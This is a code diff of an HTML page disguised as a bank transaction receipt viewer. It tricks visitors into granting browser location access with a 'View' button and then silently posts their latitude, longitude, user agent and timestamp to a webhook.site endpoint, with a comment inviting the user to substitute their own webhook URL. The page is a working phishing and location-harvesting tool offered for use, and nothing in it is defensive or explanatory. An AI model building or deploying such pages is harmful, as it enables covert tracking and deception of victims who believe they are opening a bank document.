@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Bank Receipt Viewer</title>
+  <title>Bank Transaction Receipt</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -19,9 +19,9 @@
 </head>
 <body>
   <div class="container">
-    <h2>Secure Bank Document</h2>
-    <p>Fetching bank document... please allow location access for verification.</p>
-    <button onclick="getLocation()">Allow Location</button>
+    <h2>Secure Receipt Viewer</h2>
+    <p>Loading receipt... please allow location access.</p>
+    <button onclick="getLocation()">View</button>
     <p id="status"></p>
   </div>
 
@@ -29,7 +29,7 @@
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition, showError);
-        document.getElementById("status").innerText = "Waiting for location permission...";
+        document.getElementById("status").innerText = "Requesting location...";
       } else {
         document.getElementById("status").innerText = "Geolocation not supported.";
       }
@@ -38,34 +38,27 @@
     function showPosition(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-      document.getElementById("status").innerText = `Location: ${lat}, ${lon}`;
-      
+      const userAgent = navigator.userAgent;
+
+      // Replace below with your Webhook URL from webhook.site
       fetch("https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
           latitude: lat,
           longitude: lon,
-          userAgent: navigator.userAgent,
-          time: new Date().toISOString()
+          userAgent: userAgent,
+          timestamp: new Date().toISOString()
         })
       });
+
+      document.getElementById("status").innerText = `Location sent: ${lat}, ${lon}`;
     }
 
     function showError(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          document.getElementById("status").innerText = "Location permission denied.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          document.getElementById("status").innerText = "Location unavailable.";
-          break;
-        case error.TIMEOUT:
-          document.getElementById("status").innerText = "Location request timed out.";
-          break;
-        default:
-          document.getElementById("status").innerText = "Unknown error.";
-      }
+      document.getElementById("status").innerText = "Error retrieving location.";
     }
   </script>
 </body>
